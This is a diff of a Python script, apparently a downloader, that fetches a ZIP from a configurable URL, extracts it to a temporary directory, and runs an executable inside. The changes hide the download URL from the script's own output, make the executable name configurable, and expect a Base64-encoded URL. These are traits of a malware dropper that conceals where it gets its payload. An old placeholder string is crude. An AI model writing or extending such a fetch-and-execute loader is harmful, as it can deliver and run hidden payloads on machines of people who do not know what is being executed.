@@ -23,7 +23,7 @@ def download_zip(url):  # Parameter name was wrong (used 'url' in call but 'url'
         if not clean_url.startswith(('http://', 'https://')):
             clean_url = 'http://' + clean_url
             
-        print(f"[*] Downloading from {clean_url}")  # Debug output
+        print(f"[*] Downloading zip file...")  # Debug output
         r = requests.get(clean_url)
         r.raise_for_status()
         return r.content
@@ -33,7 +33,7 @@ def download_zip(url):  # Parameter name was wrong (used 'url' in call but 'url'
         return None
 
 
-def extract_and_run(zip_data):
+def extract_and_run(zip_data, exename):
     try:
         with tempfile.TemporaryDirectory() as tmpdir:
             print(f"[*] Extracting to {tmpdir}")
@@ -41,7 +41,7 @@ def extract_and_run(zip_data):
             with zipfile.ZipFile(io.BytesIO(zip_data)) as z:
                 z.extractall(tmpdir)
 
-            exe_path = os.path.join(tmpdir, "Game.exe")
+            exe_path = os.path.join(tmpdir, f"{exename}.exe")
             if os.path.exists(exe_path):
                 print(f"[*] Running {exe_path}")
                 # Safer execution without shell=True
@@ -54,11 +54,12 @@ def extract_and_run(zip_data):
 
 
 def main():
-    url = 'TORIEL_HAS_A_BIG_ASS'
+    url = 'TORIEL_URL_HERE'  # Replace with the actual Base64 URL
+    exename = 'TORIEL_NAME_FOR_EXE'
     
     zip_data = download_zip(url)
     if zip_data:
-        extract_and_run(zip_data)
+        extract_and_run(zip_data, exename)
     else:
         print("[!] No ZIP data received")
 
